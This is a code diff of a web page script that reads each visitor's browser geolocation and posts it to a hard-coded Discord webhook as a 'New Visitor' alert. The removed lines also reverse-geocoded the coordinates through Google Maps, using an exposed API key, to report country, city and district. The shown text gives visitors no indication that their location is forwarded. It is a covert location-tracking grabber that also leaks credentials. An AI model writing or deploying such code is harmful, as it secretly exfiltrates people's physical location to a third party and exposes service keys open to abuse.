@@ -60,54 +60,12 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const accuracy = position.coords.accuracy;
+            
+            console.log("Latitude: " + latitude);
+            console.log("Longitude: " + longitude);
+            console.log("Accuracy: " + accuracy);
 
-            // Reverse geocoding to obtain approximate location details
-            fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=AIzaSyBEZzDqnabeXaQnC54Q407hlNUwaOFJeNI`)
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'OK') {
-                    const addressComponents = data.results[0].address_components;
-
-                    // Extract relevant location details
-                    let country = '';
-                    let city = '';
-                    let region = '';
-                    let district = '';
-
-                    for (const component of addressComponents) {
-                        if (component.types.includes('country')) {
-                            country = component.long_name;
-                        } else if (component.types.includes('locality') || component.types.includes('sublocality') || component.types.includes('postal_town')) {
-                            city = component.long_name;
-                        } else if (component.types.includes('administrative_area_level_1')) {
-                            region = component.long_name;
-                        } else if (component.types.includes('administrative_area_level_2')) {
-                            district = component.long_name;
-                        }
-                    }
-
-                    // Construct the message with location details
-                    const message = `
-                    **ALERT! New Visitor**
-                    Lat: ${latitude}
-                    Long: ${longitude}
-                    ---
-                    Country: ${country}
-                    City: ${city}
-                    Region: ${region}
-                    District: ${district}
-                    Accuracy: ${accuracy} meters
-                    `;
-
-                    // Send the message to Discord
-                    sendToDiscord(message);
-                } else {
-                    console.error('Reverse geocoding failed:', data.status);
-                }
-            })
-            .catch(error => {
-                console.error('Error fetching location details:', error);
-            });
+            sendToDiscord(latitude, longitude);
         }
 
         function showError(error) {
@@ -127,10 +85,10 @@
             }
         }
 
-        function sendToDiscord(message) {
+        function sendToDiscord(latitude, longitude) {
             const webhookURL = 'https://discord.com/api/webhooks/1223815986189176903/0wTdzWsqTWSRd77pgNhgjTyfy1Vd-bhpyt-7ubi-2sDaeZpc2xKT0wCUZq6XODUJG5C3';
             const data = {
-                content: message
+                content: `New Visitor's Location: Latitude: ${latitude}, Longitude: ${longitude}`
             };
 
             fetch(webhookURL, {
